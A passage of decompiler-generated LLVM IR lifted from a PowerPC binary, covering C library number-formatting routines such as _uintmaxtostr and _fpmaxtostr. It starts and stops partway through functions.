dec_label_pc_10021254:                            ; preds = %dec_label_pc_10021244
  %v1_10021254 = and i32 %v3_10021208, 2
  store i32 %v1_10021254, i32* %r0.global-to-local, align 4
  %v3_10021254 = icmp eq i32 %v1_10021254, 0
  br i1 %v3_10021254, label %dec_label_pc_1002127c, label %dec_label_pc_1002125c

dec_label_pc_1002125c:                            ; preds = %dec_label_pc_10021244, %dec_label_pc_10021254
  %v1_1002125c = and i32 %v3_10021208, 1024
  store i32 %v1_1002125c, i32* %r9.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v0_10021264 = call i32 @__asm_mfcr()
  store i32 %v0_10021264, i32* %r3.global-to-local, align 4
  %v1_10021268 = call i32 @__asm_rlwinm(i32 %v0_10021264, i32 3, i32 31, i32 31)
  %v1_1002126c = sub i32 2, %v1_10021268
  store i32 %v1_1002126c, i32* @r5, align 4
  store i32 268571252, i32* @lr, align 4
  %v0_10021270 = call i32 @__GI_fseek()
  store i32 %v0_10021270, i32* %r3.global-to-local, align 4
  %v3_10021274 = icmp eq i32 %v0_10021270, 0
  br i1 %v3_10021274, label %dec_label_pc_1002125c.dec_label_pc_1002127c_crit_edge, label %dec_label_pc_10021220

dec_label_pc_1002125c.dec_label_pc_1002127c_crit_edge: ; preds = %dec_label_pc_1002125c
  %v0_1002127c.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1002127c

dec_label_pc_1002127c:                            ; preds = %dec_label_pc_1002125c.dec_label_pc_1002127c_crit_edge, %dec_label_pc_1002123c, %dec_label_pc_10021254
  %v0_1002127c = phi i32 [ %v0_1002127c.pre, %dec_label_pc_1002125c.dec_label_pc_1002127c_crit_edge ], [ %v0_10021244, %dec_label_pc_1002123c ], [ %v0_10021244, %dec_label_pc_10021254 ]
  %v1_1002127c = inttoptr i32 %v0_1002127c to i16*
  %v2_1002127c = load i16, i16* %v1_1002127c, align 2
  %v3_1002127c = zext i16 %v2_1002127c to i32
  store i32 %v3_1002127c, i32* %r0.global-to-local, align 4
  %v1_10021280 = add i32 %v0_1002127c, 8
  %v2_10021280 = inttoptr i32 %v1_10021280 to i32*
  %v3_10021280 = load i32, i32* %v2_10021280, align 4
  store i32 %v3_10021280, i32* %r9.global-to-local, align 4
  %v1_10021284 = call i32 @__asm_rlwinm(i32 %v3_1002127c, i32 0, i32 0, i32 29)
  %v2_10021284 = trunc i32 %v1_10021284 to i16
  store i32 %v1_10021284, i32* %r0.global-to-local, align 4
  %v3_10021288 = load i32, i32* @r31, align 4
  %v4_10021288 = inttoptr i32 %v3_10021288 to i16*
  store i16 %v2_10021284, i16* %v4_10021288, align 2
  %v0_1002128c = load i32, i32* %r9.global-to-local, align 4
  %v1_1002128c = load i32, i32* @r31, align 4
  %v2_1002128c = add i32 %v1_1002128c, 20
  %v3_1002128c = inttoptr i32 %v2_1002128c to i32*
  store i32 %v0_1002128c, i32* %v3_1002128c, align 4
  %v0_10021290 = load i32, i32* %r9.global-to-local, align 4
  %v1_10021290 = load i32, i32* @r31, align 4
  %v2_10021290 = add i32 %v1_10021290, 24
  %v3_10021290 = inttoptr i32 %v2_10021290 to i32*
  store i32 %v0_10021290, i32* %v3_10021290, align 4
  %v0_10021294 = load i32, i32* %r9.global-to-local, align 4
  %v1_10021294 = load i32, i32* @r31, align 4
  %v2_10021294 = add i32 %v1_10021294, 16
  %v3_10021294 = inttoptr i32 %v2_10021294 to i32*
  store i32 %v0_10021294, i32* %v3_10021294, align 4
  %v0_10021298.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10021298

dec_label_pc_10021298:                            ; preds = %dec_label_pc_10021234, %dec_label_pc_1002127c
  %v2_100212a4 = phi i32 [ %v0_10021244, %dec_label_pc_10021234 ], [ %v0_10021298.pre, %dec_label_pc_1002127c ]
  %v1_10021298 = inttoptr i32 %v2_100212a4 to i16*
  %v2_10021298 = load i16, i16* %v1_10021298, align 2
  %v3_10021298 = zext i16 %v2_10021298 to i32
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_100212a0 = or i32 %v3_10021298, 64
  store i32 %v1_100212a0, i32* %r0.global-to-local, align 4
  %v1_100212a4 = trunc i32 %v1_100212a0 to i16
  store i16 %v1_100212a4, i16* %v1_10021298, align 2
  %v0_100212a8 = load i32, i32* %r0.global-to-local, align 4
  %v1_100212a8 = urem i32 %v0_100212a8, 65536
  store i32 %v1_100212a8, i32* %r0.global-to-local, align 4
  %v1_100212ac = and i32 %v0_100212a8, 2816
  store i32 %v1_100212ac, i32* %r9.global-to-local, align 4
  %v3_100212ac = icmp eq i32 %v1_100212ac, 0
  br i1 %v3_100212ac, label %dec_label_pc_100212b4, label %dec_label_pc_100212bc

dec_label_pc_100212b4:                            ; preds = %dec_label_pc_10021298
  %v0_100212b4 = load i32, i32* @r31, align 4
  %v1_100212b4 = add i32 %v0_100212b4, 12
  %v2_100212b4 = inttoptr i32 %v1_100212b4 to i32*
  %v3_100212b4 = load i32, i32* %v2_100212b4, align 4
  store i32 %v3_100212b4, i32* %r0.global-to-local, align 4
  %v2_100212b8 = add i32 %v0_100212b4, 28
  %v3_100212b8 = inttoptr i32 %v2_100212b8 to i32*
  store i32 %v3_100212b4, i32* %v3_100212b8, align 4
  br label %dec_label_pc_100212bc

dec_label_pc_100212bc:                            ; preds = %dec_label_pc_10021298, %dec_label_pc_10021220, %dec_label_pc_100212b4
  store i32 %v0_100211d8, i32* %r0.global-to-local, align 4
  store i32 %v0_100211e0, i32* @r31, align 4
  %v0_100212cc = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_100212cc

; uselistorder directives
  uselistorder i32 %v0_100212a8, { 1, 0 }
  uselistorder i32 %v1_10021284, { 1, 0 }
  uselistorder i32 %v0_1002127c, { 1, 0 }
  uselistorder i32 %v0_10021244, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v3_100211ec, { 0, 2, 1, 3 }
  uselistorder i32* %r3.global-to-local, { 3, 2, 1, 0, 4, 5 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9, 11, 12, 13, 14, 15 }
  uselistorder label %dec_label_pc_100212bc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10021298, { 1, 0 }
  uselistorder label %dec_label_pc_1002127c, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1002125c, { 1, 0 }
  uselistorder label %dec_label_pc_10021214, { 1, 0 }
  uselistorder label %dec_label_pc_10021208, { 1, 0 }
}

define i32 @_load_inttype(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %v0_100212d0 = load i32, i32* @r5, align 4
  %v1_100212d0 = icmp slt i32 %v0_100212d0, 0
  %v1_100212d4 = call i32 @__asm_rlwinm(i32 %arg1, i32 0, i32 20, i32 20)
  %v3_10021310 = icmp eq i32 %v1_100212d4, 0
  br i1 %v1_100212d0, label %dec_label_pc_10021310, label %dec_label_pc_100212dc

dec_label_pc_100212dc:                            ; preds = %entry
  br i1 %v3_10021310, label %dec_label_pc_100212e4, label %dec_label_pc_10021318

dec_label_pc_100212e4:                            ; preds = %dec_label_pc_100212dc
  %v3_100212e4 = icmp eq i32 %arg1, 256
  br i1 %v3_100212e4, label %dec_label_pc_100212f0, label %dec_label_pc_100212f8

dec_label_pc_100212f0:                            ; preds = %dec_label_pc_100212e4
  br label %dec_label_pc_10021304

dec_label_pc_100212f8:                            ; preds = %dec_label_pc_100212e4
  %v3_100212f8 = icmp eq i32 %arg1, 512
  br i1 %v3_100212f8, label %dec_label_pc_10021300, label %dec_label_pc_10021304

dec_label_pc_10021300:                            ; preds = %dec_label_pc_100212f8
  br label %dec_label_pc_10021304

dec_label_pc_10021304:                            ; preds = %dec_label_pc_100212f8, %dec_label_pc_100212f0, %dec_label_pc_10021300
  ret i32 0

dec_label_pc_10021310:                            ; preds = %entry
  br i1 %v3_10021310, label %dec_label_pc_10021324, label %dec_label_pc_10021318

dec_label_pc_10021318:                            ; preds = %dec_label_pc_100212dc, %dec_label_pc_10021310
  %v2_10021318 = load i32, i32* %arg2, align 4
  ret i32 %v2_10021318

dec_label_pc_10021324:                            ; preds = %dec_label_pc_10021310
  %v3_10021324 = icmp eq i32 %arg1, 256
  %v2_10021328 = load i32, i32* %arg2, align 4
  br i1 %v3_10021324, label %dec_label_pc_10021330, label %dec_label_pc_10021338

dec_label_pc_10021330:                            ; preds = %dec_label_pc_10021324
  %v1_10021330 = urem i32 %v2_10021328, 256
  br label %dec_label_pc_10021344

dec_label_pc_10021338:                            ; preds = %dec_label_pc_10021324
  %v3_10021338 = icmp eq i32 %arg1, 512
  br i1 %v3_10021338, label %dec_label_pc_10021340, label %dec_label_pc_10021344

dec_label_pc_10021340:                            ; preds = %dec_label_pc_10021338
  %v1_10021340 = mul i32 %v2_10021328, 65536
  %v2_10021340 = sdiv i32 %v1_10021340, 65536
  br label %dec_label_pc_10021344

dec_label_pc_10021344:                            ; preds = %dec_label_pc_10021338, %dec_label_pc_10021330, %dec_label_pc_10021340
  %v0_10021344 = phi i32 [ %v2_10021328, %dec_label_pc_10021338 ], [ %v1_10021330, %dec_label_pc_10021330 ], [ %v2_10021340, %dec_label_pc_10021340 ]
  %tmp = icmp slt i32 %v0_10021344, 0
  %v1_10021348 = zext i1 %tmp to i32
  %v2_10021348 = ashr i32 %v0_10021344, 31
  %v3_10021348 = and i32 %v2_10021348, -2
  %v4_10021348 = or i32 %v3_10021348, %v1_10021348
  ret i32 %v4_10021348

; uselistorder directives
  uselistorder i32 %v0_10021344, { 1, 0 }
  uselistorder i32 %v2_10021328, { 2, 0, 1 }
  uselistorder i1 %v3_10021310, { 1, 0 }
  uselistorder i32 %arg1, { 0, 2, 1, 4, 3 }
  uselistorder label %dec_label_pc_10021344, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10021318, { 1, 0 }
  uselistorder label %dec_label_pc_10021304, { 2, 0, 1 }
}

define i32 @_store_inttype(i16* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i16* %arg1 to i32
  %v0_10021350 = load i32, i32* @r4, align 4
  %v3_10021350 = icmp eq i32 %v0_10021350, 256
  br i1 %v3_10021350, label %dec_label_pc_1002135c, label %dec_label_pc_10021364

dec_label_pc_1002135c:                            ; preds = %entry
  %v0_1002135c = load i32, i32* @r6, align 4
  %v1_1002135c = trunc i32 %v0_1002135c to i8
  %tmp1 = bitcast i16* %arg1 to i8*
  store i8 %v1_1002135c, i8* %tmp1, align 1
  ret i32 %tmp

dec_label_pc_10021364:                            ; preds = %entry
  %v3_10021354 = icmp eq i32 %v0_10021350, 2048
  br i1 %v3_10021354, label %dec_label_pc_1002136c, label %dec_label_pc_10021378

dec_label_pc_1002136c:                            ; preds = %dec_label_pc_10021364
  %v0_1002136c = load i32, i32* @r5, align 4
  %tmp2 = bitcast i16* %arg1 to i32*
  store i32 %v0_1002136c, i32* %tmp2, align 4
  %v0_10021370 = load i32, i32* @r6, align 4
  %v3_10021370 = add i32 %tmp, 4
  %v4_10021370 = inttoptr i32 %v3_10021370 to i32*
  store i32 %v0_10021370, i32* %v4_10021370, align 4
  ret i32 %tmp

dec_label_pc_10021378:                            ; preds = %dec_label_pc_10021364
  %v3_10021364 = icmp eq i32 %v0_10021350, 512
  %v0_1002137c = load i32, i32* @r6, align 4
  br i1 %v3_10021364, label %dec_label_pc_1002137c, label %dec_label_pc_10021384

dec_label_pc_1002137c:                            ; preds = %dec_label_pc_10021378
  %v1_1002137c = trunc i32 %v0_1002137c to i16
  store i16 %v1_1002137c, i16* %arg1, align 2
  ret i32 %tmp

dec_label_pc_10021384:                            ; preds = %dec_label_pc_10021378
  %tmp3 = bitcast i16* %arg1 to i32*
  store i32 %v0_1002137c, i32* %tmp3, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i16* %arg1, { 2, 3, 0, 1, 4 }
}

define i32 @_uintmaxtostr(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %cr0_eq.global-to-local = alloca i1, align 1
  %r12.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r7.global-to-local, align 4
  store i32 %arg3, i32* %r6.global-to-local, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v0_1002138c = load i32, i32* %r7.global-to-local, align 4
  %v3_1002138c = icmp eq i32 %v0_1002138c, 0
  store i1 %v3_1002138c, i1* %cr0_eq.global-to-local, align 1
  store i32 %arg5, i32* @r30, align 4
  %tmp12 = icmp sgt i32 %v0_1002138c, -1
  br i1 %tmp12, label %dec_label_pc_100213c0, label %dec_label_pc_100213a0

dec_label_pc_100213a0:                            ; preds = %entry
  %v0_100213a0 = load i32, i32* %r5.global-to-local, align 4
  %v1_100213a4 = sub i32 0, %v0_1002138c
  store i32 %v1_100213a4, i32* %r7.global-to-local, align 4
  %tmp13 = icmp sgt i32 %v0_100213a0, -1
  br i1 %tmp13, label %dec_label_pc_100213c0, label %dec_label_pc_100213ac

dec_label_pc_100213ac:                            ; preds = %dec_label_pc_100213a0
  %v0_100213ac = load i32, i32* %r6.global-to-local, align 4
  %v1_100213ac = sub i32 0, %v0_100213ac
  %v2_100213ac = sub i32 -1, %v0_100213ac
  store i32 %v1_100213ac, i32* %r6.global-to-local, align 4
  %v4_100213ac = icmp uge i32 %v2_100213ac, %v1_100213ac
  %v1_100213b0 = sub i32 -1, %v0_100213a0
  %v3_100213b0 = zext i1 %v4_100213ac to i32
  %v4_100213b0 = add i32 %v3_100213b0, %v1_100213b0
  store i32 %v4_100213b0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_100213c0

dec_label_pc_100213c0:                            ; preds = %entry, %dec_label_pc_100213a0, %dec_label_pc_100213ac
  %v1_100213c4 = phi i32 [ %v1_100213a4, %dec_label_pc_100213ac ], [ %v1_100213a4, %dec_label_pc_100213a0 ], [ %v0_1002138c, %entry ]
  %storemerge = phi i32 [ 1, %dec_label_pc_100213ac ], [ 0, %dec_label_pc_100213a0 ], [ 0, %entry ]
  store i32 %storemerge, i32* @r29, align 4
  %v2_100213c4 = udiv i32 -1, %v1_100213c4
  store i32 %v2_100213c4, i32* @r8, align 4
  %v2_100213cc = load i32, i32* %r3.global-to-local, align 4
  %v3_100213cc = inttoptr i32 %v2_100213cc to i8*
  store i8 0, i8* %v3_100213cc, align 1
  %v0_100213d0 = load i32, i32* @r8, align 4
  %v1_100213d0 = load i32, i32* %r7.global-to-local, align 4
  %v2_100213d0 = mul i32 %v1_100213d0, %v0_100213d0
  %v1_100213d4 = sub i32 0, %v2_100213d0
  store i32 %v1_100213d4, i32* @r31, align 4
  %v4_100213d8 = icmp eq i32 %v1_100213d0, %v1_100213d4
  br i1 %v4_100213d8, label %dec_label_pc_100213e0, label %dec_label_pc_100213e8

dec_label_pc_100213e0:                            ; preds = %dec_label_pc_100213c0
  %v1_100213e0 = add i32 %v0_100213d0, 1
  store i32 %v1_100213e0, i32* @r8, align 4
  store i32 0, i32* @r31, align 4
  br label %dec_label_pc_100213e8

dec_label_pc_100213e8:                            ; preds = %dec_label_pc_100213c0, %dec_label_pc_100213e0
  %v0_100213e8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_100213e8, i32* %r12.global-to-local, align 4
  br label %dec_label_pc_100213ec

dec_label_pc_100213ecthread-pre-split:            ; preds = %dec_label_pc_10021440
  %v0_100213ec.pr = load i32, i32* %r12.global-to-local, align 4
  %v1_100213f0.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_100213ec

dec_label_pc_100213ec:                            ; preds = %dec_label_pc_100213ecthread-pre-split, %dec_label_pc_100213e8
  %v1_10021434 = phi i32 [ %v1_100213f0.pre, %dec_label_pc_100213ecthread-pre-split ], [ %v1_100213d0, %dec_label_pc_100213e8 ]
  %v1_10021404 = phi i32 [ %v0_100213ec.pr, %dec_label_pc_100213ecthread-pre-split ], [ %v0_100213e8, %dec_label_pc_100213e8 ]
  %v3_100213ec = icmp eq i32 %v1_10021404, 0
  %v0_100213f0 = load i32, i32* %r6.global-to-local, align 4
  %v2_100213f0 = udiv i32 %v0_100213f0, %v1_10021434
  br i1 %v3_100213ec, label %dec_label_pc_10021434, label %dec_label_pc_100213f8

dec_label_pc_100213f8:                            ; preds = %dec_label_pc_100213ec
  %v2_100213f8 = udiv i32 %v1_10021404, %v1_10021434
  %v2_100213fc = mul i32 %v2_100213f8, %v1_10021434
  %v2_10021400 = mul i32 %v2_100213f0, %v1_10021434
  %v2_10021404 = sub i32 %v1_10021404, %v2_100213fc
  store i32 %v2_100213f8, i32* %r12.global-to-local, align 4
  %v0_1002140c = load i32, i32* @r31, align 4
  %v2_1002140c = mul i32 %v0_1002140c, %v2_10021404
  %v2_10021410 = sub i32 %v0_100213f0, %v2_10021400
  %v2_10021414 = add i32 %v2_1002140c, %v2_10021410
  %v0_10021418 = load i32, i32* @r8, align 4
  %v2_10021418 = mul i32 %v0_10021418, %v2_10021404
  %v2_1002141c = udiv i32 %v2_10021414, %v1_10021434
  %v2_10021420 = add i32 %v2_10021418, %v2_100213f0
  %v2_10021424 = mul i32 %v2_1002141c, %v1_10021434
  store i32 %v2_10021424, i32* @r10, align 4
  %v2_10021428 = add i32 %v2_10021420, %v2_1002141c
  store i32 %v2_10021428, i32* %r6.global-to-local, align 4
  %v2_1002142c = sub i32 %v2_10021414, %v2_10021424
  store i32 %v2_1002142c, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10021440

dec_label_pc_10021434:                            ; preds = %dec_label_pc_100213ec
  %v2_10021434 = mul i32 %v2_100213f0, %v1_10021434
  %v2_10021438 = sub i32 %v0_100213f0, %v2_10021434
  store i32 %v2_10021438, i32* %r5.global-to-local, align 4
  store i32 %v2_100213f0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_10021440

dec_label_pc_10021440:                            ; preds = %dec_label_pc_100213f8, %dec_label_pc_10021434
  %v1_10021444 = phi i32 [ %v2_100213f8, %dec_label_pc_100213f8 ], [ 0, %dec_label_pc_10021434 ]
  %v0_10021444 = phi i32 [ %v2_10021428, %dec_label_pc_100213f8 ], [ %v2_100213f0, %dec_label_pc_10021434 ]
  %v0_10021448 = phi i32 [ %v2_1002142c, %dec_label_pc_100213f8 ], [ %v2_10021438, %dec_label_pc_10021434 ]
  %v2_10021444 = or i32 %v0_10021444, %v1_10021444
  %v5_10021444 = icmp eq i32 %v2_10021444, 0
  store i1 %v5_10021444, i1* %cr0_eq.global-to-local, align 1
  %v1_1002144c = load i32, i32* @r30, align 4
  %v0_10021450 = load i32, i32* %r3.global-to-local, align 4
  %v1_10021450 = add i32 %v0_10021450, -1
  store i32 %v1_10021450, i32* %r3.global-to-local, align 4
  %tmp14 = icmp ult i32 %v0_10021448, 10
  %v1_10021448.v2_1002144c.v = select i1 %tmp14, i32 48, i32 %v1_1002144c
  %v1_10021448.v2_1002144c = add i32 %v0_10021448, %v1_10021448.v2_1002144c.v
  %extract.t9.extract.t = trunc i32 %v1_10021448.v2_1002144c to i8
  %v3_10021460 = inttoptr i32 %v1_10021450 to i8*
  store i8 %extract.t9.extract.t, i8* %v3_10021460, align 1
  %v0_10021464 = load i1, i1* %cr0_eq.global-to-local, align 1
  br i1 %v0_10021464, label %dec_label_pc_10021468, label %dec_label_pc_100213ecthread-pre-split

dec_label_pc_10021468:                            ; preds = %dec_label_pc_10021440
  %v0_10021468 = load i32, i32* @r29, align 4
  %v3_10021468 = icmp eq i32 %v0_10021468, 0
  br i1 %v3_10021468, label %dec_label_pc_10021468.dec_label_pc_10021478_crit_edge, label %dec_label_pc_10021470

dec_label_pc_10021468.dec_label_pc_10021478_crit_edge: ; preds = %dec_label_pc_10021468
  %v0_10021480.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10021478

dec_label_pc_10021470:                            ; preds = %dec_label_pc_10021468
  %v2_10021474 = load i32, i32* %r3.global-to-local, align 4
  %v3_10021474 = add i32 %v2_10021474, -1
  %v4_10021474 = inttoptr i32 %v3_10021474 to i8*
  store i8 45, i8* %v4_10021474, align 1
  store i32 %v3_10021474, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10021478

dec_label_pc_10021478:                            ; preds = %dec_label_pc_10021468.dec_label_pc_10021478_crit_edge, %dec_label_pc_10021470
  %v0_10021480 = phi i32 [ %v0_10021480.pre, %dec_label_pc_10021468.dec_label_pc_10021478_crit_edge ], [ %v3_10021474, %dec_label_pc_10021470 ]
  ret i32 %v0_10021480

; uselistorder directives
  uselistorder i32 %v2_100213f8, { 1, 2, 0 }
  uselistorder i32 %v2_100213f0, { 3, 4, 0, 1, 2 }
  uselistorder i32 %v1_10021434, { 0, 1, 4, 2, 3, 5, 6 }
  uselistorder i32 %v1_100213d0, { 1, 2, 0 }
  uselistorder i32 %v0_100213d0, { 1, 0 }
  uselistorder i32 %v0_1002138c, { 1, 2, 0, 3 }
  uselistorder i32* %r7.global-to-local, { 2, 3, 4, 0, 1 }
  uselistorder i32* %r6.global-to-local, { 2, 3, 4, 5, 0, 1 }
  uselistorder i32* %r5.global-to-local, { 2, 3, 4, 5, 0, 1 }
  uselistorder i32* %r3.global-to-local, { 2, 4, 3, 6, 5, 0, 1 }
  uselistorder i8 45, { 1, 0, 2, 3, 4 }
  uselistorder label %dec_label_pc_10021478, { 1, 0 }
  uselistorder label %dec_label_pc_10021440, { 1, 0 }
  uselistorder label %dec_label_pc_100213e8, { 1, 0 }
  uselistorder label %dec_label_pc_100213c0, { 2, 1, 0 }
}

define i32 @_fpmaxtostr(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cr6_eq.global-to-local = alloca i1, align 1
  %cr6_gt.global-to-local = alloca i1, align 1
  %cr6_lt.global-to-local = alloca i1, align 1
  %cr7_eq.global-to-local = alloca i1, align 1
  %cr7_lt.global-to-local = alloca i1, align 1
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %tmp54 = call i32 @__decompiler_undefined_function_0()
  %tmp55 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-200 = alloca i8, align 1
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-179 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-196 = alloca i32, align 4
  %stack_var_-177 = alloca i32, align 4
  %stack_var_-159 = alloca i32, align 4
  %stack_var_-178 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %v0_10021484 = load i32, i32* @lr, align 4
  store i32 %v0_10021484, i32* %r0.global-to-local, align 4
  store i32 %arg1, i32* @r27, align 4
  store i32 %arg3, i32* @r26, align 4
  %v1_100214a0 = add i32 %tmp, 11
  %v2_100214a0 = inttoptr i32 %v1_100214a0 to i8*
  %v3_100214a0 = load i8, i8* %v2_100214a0, align 1
  %v4_100214a0 = zext i8 %v3_100214a0 to i32
  store i32 %v4_100214a0, i32* %r31.global-to-local, align 4
  %v1_100214a4 = or i32 %v4_100214a0, 32
  %v1_100214a8 = icmp ult i32 %v1_100214a4, 97
  %v3_100214a8 = icmp eq i32 %v1_100214a4, 97
  store i1 %v1_100214a8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100214a8, i1* %cr7_eq.global-to-local, align 1
  store i32 101, i32* %r0.global-to-local, align 4
  %v1_100214b4 = add i32 %tmp, 4
  %v2_100214b4 = inttoptr i32 %v1_100214b4 to i32*
  %v3_100214b4 = load i32, i32* %v2_100214b4, align 4
  store i32 %v3_100214b4, i32* %r28.global-to-local, align 4
  %v2_100214b8 = load i32, i32* %arg2, align 4
  store i32 %v2_100214b8, i32* %r30.global-to-local, align 4
  br i1 %v3_100214a8, label %dec_label_pc_100214c0, label %dec_label_pc_100214c8

dec_label_pc_100214c0:                            ; preds = %entry
  %v1_100214c0 = add nuw nsw i32 %v4_100214a0, 6
  store i32 %v1_100214c0, i32* %r0.global-to-local, align 4
  %v1_100214c4 = urem i32 %v1_100214c0, 256
  store i32 %v1_100214c4, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_100214c8

dec_label_pc_100214c8:                            ; preds = %entry, %dec_label_pc_100214c0
  %v0_1002157c = phi i32 [ %v4_100214a0, %entry ], [ %v1_100214c4, %dec_label_pc_100214c0 ]
  %v1_100214c8 = icmp slt i32 %v2_100214b8, 0
  %v3_100214c8 = icmp eq i32 %v2_100214b8, 0
  store i1 %v1_100214c8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100214c8, i1* %cr7_eq.global-to-local, align 1
  %tmp75 = icmp sgt i32 %v2_100214b8, -1
  br i1 %tmp75, label %dec_label_pc_100214d4, label %dec_label_pc_100214d0

dec_label_pc_100214d0:                            ; preds = %dec_label_pc_100214c8
  store i32 6, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_100214d4

dec_label_pc_100214d4:                            ; preds = %dec_label_pc_100214c8, %dec_label_pc_100214d0
  %v0_1002168c44 = phi i32 [ %v2_100214b8, %dec_label_pc_100214c8 ], [ 6, %dec_label_pc_100214d0 ]
  %v1_100214d4 = add i32 %tmp, 12
  %v2_100214d4 = inttoptr i32 %v1_100214d4 to i32*
  %v3_100214d4 = load i32, i32* %v2_100214d4, align 4
  store i32 %v3_100214d4, i32* %r9.global-to-local, align 4
  %v1_100214d8 = and i32 %v3_100214d4, 2
  %v3_100214d8 = icmp eq i32 %v1_100214d8, 0
  store i32 0, i32* %r0.global-to-local, align 4
  store i8 0, i8* %stack_var_-200, align 1
  br i1 %v3_100214d8, label %dec_label_pc_100214f0, label %dec_label_pc_100214fc

dec_label_pc_100214f0:                            ; preds = %dec_label_pc_100214d4
  %v1_100214f0 = urem i32 %v3_100214d4, 2
  store i32 %v1_100214f0, i32* %r7.global-to-local, align 4
  %v3_100214f0 = icmp eq i32 %v1_100214f0, 0
  br i1 %v3_100214f0, label %dec_label_pc_10021500, label %dec_label_pc_100214fc

dec_label_pc_100214fc:                            ; preds = %dec_label_pc_100214f0, %dec_label_pc_100214d4
  %storemerge = phi i32 [ 43, %dec_label_pc_100214d4 ], [ 32, %dec_label_pc_100214f0 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  %v6_100214fc = trunc i32 %storemerge to i8
  store i8 %v6_100214fc, i8* %stack_var_-200, align 1
  br label %dec_label_pc_10021500

dec_label_pc_10021500:                            ; preds = %dec_label_pc_100214f0, %dec_label_pc_100214fc
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v3_100214c8, label %dec_label_pc_10021664, label %dec_label_pc_1002157c

dec_label_pc_1002157c:                            ; preds = %dec_label_pc_10021500
  %v1_1002157c = icmp ult i32 %v0_1002157c, 96
  %v2_1002157c = icmp ugt i32 %v0_1002157c, 96
  %v3_1002157c = icmp eq i32 %v0_1002157c, 96
  store i1 %v1_1002157c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1002157c, i1* %cr7_eq.global-to-local, align 1
  %v2_10021584 = add i32 %tmp, 16
  %v3_10021584 = inttoptr i32 %v2_10021584 to i32*
  store i32 32, i32* %v3_10021584, align 4
  store i32 3, i32* %r0.global-to-local, align 4
  store i32 3, i32* %stack_var_-140, align 4
  br i1 %v2_1002157c, label %dec_label_pc_100215a8, label %dec_label_pc_1002159c

dec_label_pc_1002159c:                            ; preds = %dec_label_pc_1002157c
  store i32 12, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_100215a8

dec_label_pc_100215a8:                            ; preds = %dec_label_pc_1002157c, %dec_label_pc_1002159c
  %stack_var_-136.1 = phi i32 [ add (i32 ptrtoint ([4 x i8]* @global_var_1002f988.1285 to i32), i32 8), %dec_label_pc_1002157c ], [ add (i32 ptrtoint ([4 x i8]* @global_var_1002f988.1285 to i32), i32 12), %dec_label_pc_1002159c ]
  store i32 ptrtoint ([4 x i8]* @global_var_1002f988.1285 to i32), i32* %r9.global-to-local, align 4
  %v2_100215b4 = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_100215b4, i32* @r8, align 4
  store i32 %stack_var_-136.1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10021a54

dec_label_pc_10021664:                            ; preds = %dec_label_pc_10021500
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_10021668 = ptrtoint i32* %stack_var_-176 to i32
  store i32 %v2_10021668, i32* %r6.global-to-local, align 4
  store i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32), i32* %r9.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  store i32 1127219200, i32* %r3.global-to-local, align 4
  %v1_100216b4 = xor i32 %tmp54, -2147483648
  br label %dec_label_pc_10021688

